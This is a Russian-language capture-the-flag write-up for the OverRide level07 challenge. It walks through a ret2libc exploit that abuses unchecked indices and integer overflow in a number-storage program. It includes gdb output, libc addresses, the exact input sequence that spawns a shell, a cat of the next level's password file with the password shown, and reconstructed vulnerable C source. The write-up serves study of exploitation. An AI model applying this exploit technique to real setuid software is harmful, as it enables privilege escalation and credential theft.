# LEVEL 07

## Команды и ресурсы
gdb

## Уязвимость
Ret2libc attack

## Решение
1. Программа позволяет сохранять числа и ждет на вход команды:
- store: сохраняет число по заданному индексу (index%3=0  - зарезервированы и неддоступны для записи)
- read: возвращает число по заданному индексу
- quit: завершает работу программы

2. Посмотрим дизассемблированный код. Детальный анализ [тут](resources/disas.md)
В программе присутствуют следующие функции:
- main
- read_number
- store_number
- get_unum
- clear_stdin

Программа представляет собой хранилище чисел (хранятся в локальных переменных в буфере размером 400байт)

3. Видим, что в самой программе никакого вызова system("/bin/sh") нет. В переменную окружения
поместить шелл-код также не получится,так как память под аргументы программы и переменные окружения зануляется
с помощью memset.

4. Можем осуществить ret2libc attack и перезаписать адрес возврата функции. Мы можем это сделать. так как при сохранении
чисел в буфер, никакой проверки на индексы не происходит и технически мы можем записать нужные адреса непосредственно в адрес возрата.
Осталось определить, по какому индексу и что конкретно нам надо записать.

5. Попробуем определить оффсет адреса возврата функции от адреса буфера с числами

```bash
(gdb) i f
Stack level 0, frame at 0xffffd690:
 eip = 0x8048724 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd690
 Saved registers:
  ebp at 0xffffd688, eip at 0xffffd68c

```
- Адрес возврата - 0xffffd68c

```asm
Input command: store
 Number: 31
 Index: 1
 Completed store command successfully
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) i r
eax            0xffffd4c4	-11068

```
- адрес буфера - 0xffffd4c4

- оффсет - 0xffffd68c - 0xffffd4c4 = 456 байт или 114 интовых чисел (456 / 4 = 114)

6. Теперь определим адреса system, exit, "bin/sh"

```asm
(gdb) p system
$5 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$6 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"

```

7. То есть нам нужно записать найденные адреса по индексу 114, 115, 116. Но есть нюанс. В программе все индексы, делящиеся на 3 без остатка
зарезервированы и недоступны для записи. То есть с сохранением данных по индексу 114 есть сложности.

- Попробуем воспользоваться переполнением интов и подобрать такое число, которое с учетом переполнения выведет нас на нужный индекс 114, и при этом 
при остатке деления на 3 не будет давать 0

max int = 2^32
index = (2^32 / 4) + 114 = 1073741938

1073741938 % 3 = 1 индекс не защищен. Бинго

6. Генерим итоговый эксплойт:
```
[ адрес system ] [ адрес of exit ] [ адрес "/bin/sh" ]
0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # адрес
4159090384           4159040368             4160264172          # адрес в десятеричном виде
     |                     |                     |
1073741938              115                    116              # индекс
buffer[114]          buffer[115]            buffer[116]   

```

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## Воссоздадим бинарный файл
```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

void clear_stdin(void)
{
    char x = 0;
    while(1)
    {
        x = getchar();
        if(x == '\n' || x == EOF)
            break;
    }
}

unsigned int get_unum(void)
{
    unsigned int res = 0;
    fflush(stdout);
    scanf("%u", &res);
    clear_stdin();
    return res;
}

int store_number(int32_t *buffer) {
    int number;                // EBP - 0x10
    int index;                 // EBP - 0xc

    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();


    if (index % 3 == 0 || (number >> 0x18) == 0xb7) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return (1);
    }

    buffer[index] = number;
    return 0;
}

int read_number(int32_t *buffer) {
    int index = 0;                 // EBP - 0xc

    printf(" Index:");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, buffer[index]);
    return 0;
}

int main(int argc, char **av, char **ep) {
//    char **av = argv;                               // ESP + 0x1c
//    char **ep = envp;                               // ESP + 0x18

    int cmd_ret = 0;                                // ESP + 0x1b4
    char cmd_buffer[20] = {0};                      // ESP + 0x1b8
    int buffer[100] = {0};                          // ESP + 0x24

    while (*av) {
        memset(*av, 0, strlen(*av));
        *av++;
    }
    while (*ep) {
        memset(*ep, 0, strlen(*ep));
        *ep++;
    }

    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");

    while (1) {
        cmd_ret = 1;
        printf("Input command: ");
        fgets(cmd_buffer, 20, stdin);
        cmd_buffer[strlen(cmd_buffer) - 1] = 0;

        if (!strncmp(cmd_buffer, "store", 5)) {
            cmd_ret = store_number(buffer);
        } else if (!strncmp(cmd_buffer, "read", 4)) {
            cmd_ret = read_number(buffer);
        } else if (!strncmp(cmd_buffer, "quit", 4)) {
            return 0;
        }

        if (cmd_ret == 0) {
            printf(" Completed %s command successfully\n", cmd_buffer);
        } else {
            printf(" Failed to do %s command\n", cmd_buffer);
        }
        memset(&cmd_buffer, 0, 20);
    }
    return 0;
}
```


## Переносим на виртуальную машину, компилируем, проверяем
1. Копируем на виртуальную машину
``` bash
 scp -P 4242 ~/42/override/level07/source.c level07@192.168.56.129:/tmp/source_level07.c
 ```

2. заходим под level02 на виртуальную машину
```bash
su level08
```

3. Компилируем

```bash
cd /tmp
gcc -z execstack -m32 source_level07.c -o level07
```
```bash
level08@OverRide:/tmp$ checksec --file level07


```

4. Меняем права
```bash
level08@OverRide:/tmp$ chmod u+s level07; chmod +wx level07; chmod +s level07;

```
5. Возвращаемся в юзера level07 и Запускаем
```bash
level08@OverRide:/tmp$ exit


```
6. Проверяем уязвимость

```bash



```